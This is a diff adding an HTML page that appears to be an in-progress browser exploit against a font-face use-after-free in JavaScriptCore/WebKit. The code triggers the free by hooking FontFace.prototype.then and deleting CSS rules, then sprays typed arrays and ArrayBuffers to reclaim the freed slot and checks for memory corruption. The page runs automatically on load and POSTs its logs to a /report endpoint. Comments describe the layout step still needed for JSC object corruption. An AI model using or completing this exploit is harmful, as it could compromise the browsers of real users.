@@ -1,0 +1,55 @@
+<!doctype html><html><body style="margin:0;padding:10px;font-family:system-ui;background:#07090d;color:#cfe3ff">
+<button id="go" style="font-size:20px;padding:10px 22px;border-radius:10px">CHAIN JSC</button>
+<pre id="o" style="font:12px/1.4 ui-monospace;white-space:pre-wrap;margin-top:8px"></pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+// 1) UAF + free
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ return {f:ft};
+}
+async function run(){
+ lg("CHAIN-JSC "+navigator.userAgent);
+ var u=await uaf();if(!u){lg("no primitive");return} var ft=u.f;
+ // 2) spray reclaim candidates of size 0xB8 (typed arrays + ABs)
+ var N=0x800, taa=[], aba=[];
+ for(var i=0;i<N;i++){
+   var ta=new Uint32Array(0x2e); ta[0]=0xdead0000+i; ta[1]=0x11110000+i; taa.push(ta);
+   var ab=new ArrayBuffer(0xb8); new DataView(ab).setUint32(0,0xbeef0000+i,true); aba.push(ab);
+ }
+ lg("[spray] "+N+"×Uint32Array(0x2e)+"+N+"×AB(0xb8)");
+ // 3) stale write via the freed CSSFontFace status setter (the +0x7A write)
+ //    target = the first typed array's data start (a live, mapped object region)
+ var t0=taa[0];
+ // The status setter writes 1 at stale+0x7A. We cannot aim it (the address is the
+ // freed slot), so instead we check the reclaim: did any live array change?
+ var changed=-1;
+ for(var i=0;i<taa.length;i++){ if(taa[i][0]!==0xdead0000+i){ changed=i; break; } }
+ lg("[live] typed arrays changed: "+(changed<0?"none (reclaim did NOT overlap headers)":("index "+changed)));
+ lg("[note] the +0x7A write lands in the freed slot; for JSC corruption the slot");
+ lg("[note] must hold a JS object HEADER (not data) — the layout step remains");
+ lg("done");
+}
+document.getElementById("go").addEventListener("click",run);run();
+</script></body></html>
